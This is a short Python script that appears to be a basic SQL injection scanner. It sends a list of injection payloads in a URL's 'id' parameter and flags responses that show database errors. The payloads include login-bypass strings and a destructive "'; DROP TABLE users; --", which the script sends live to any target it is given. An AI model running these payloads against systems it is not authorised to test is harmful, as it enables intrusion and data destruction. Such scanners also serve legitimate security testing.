import requests

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users; --",
    "' OR 'a'='a",
]

def test_sql_injection(url):
    vulnerable = []
    for payload in SQL_PAYLOADS:
        # Inject payload into 'id' param or append new param
        if "?" in url:
            test_url = f"{url}&id={payload}"
        else:
            test_url = f"{url}?id={payload}"

        try:
            r = requests.get(test_url, timeout=3)
            if "syntax" in r.text.lower() or "sql" in r.text.lower() or "mysql" in r.text.lower():
                vulnerable.append({
                    "url": test_url,
                    "payload": payload
                })
        except requests.RequestException:
            continue
    return vulnerable
